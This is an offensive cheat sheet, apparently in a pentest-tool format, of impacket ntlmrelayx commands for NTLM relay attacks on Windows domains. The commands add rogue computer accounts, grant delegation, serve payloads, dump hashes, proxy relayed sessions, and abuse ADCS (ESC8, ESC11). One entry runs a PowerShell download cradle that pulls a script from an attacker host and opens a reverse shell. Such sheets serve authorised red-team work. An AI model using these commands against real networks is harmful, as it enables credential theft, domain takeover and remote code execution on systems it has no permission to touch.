# ntlmrelayx (imp)

% impacket-mitm, windows, smb, 445

#plateform/linux  #target/remote #cat/ATTACK/RELAY
## add computer
```
ntlmrelayx -t ldaps://<dc1> -smb2support --remove-mic --add-computer <computer_name> <computer_password> --delegate-access
```
## host a payload that will automatically be served to the remote host connecting
#plateform/linux #target/serve #cat/ATTACK/MITM 

```
ntlmrelayx.py -tf <targets_file> -smb2support -e <payload_file|payload.exe>
```

## reverseshell (nishang)
#plateform/linux #target/serve #cat/ATTACK/MITM 
Or powershell -e base64_string
```
ntlmrelayx.py -tf <targets_file> -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://<ip>:<http_port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <rport>"
```

## socks
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
ntlmrelayx.py -tf <targets_file> -socks -smb2support
```

## authenticate and dump hash
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
ntlmrelayx.py -tf <targets_file> -smb2support
```

## to use with mitm6 - relay to target
#plateform/linux #target/serve #cat/ATTACK/MITM 
Next use the socks with proxychains : 
proxychains smbclient //ip/Users -U domain/user

```
ntlmrelayx.py -6 -wh <attacker_ip> -t smb://<target> -l /tmp -socks -debug
```

## to use with mitm6 - delegate access
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
ntlmrelayx.py -t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access
```


## ADCS relay attack ESC8
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
ntlmrelayx.py -t http://<ca_ip>/certsrv/certfnsh.asp -smb2support --adcs --template <template>
```

## ADCS relay attack ESC11
#plateform/linux #target/serve #cat/ATTACK/MITM 
```
ntlmrelayx.py -t rpc://<ca_ip> -rpc-mode ICPR -icpr-ca-name <ca_name> -smb2support
```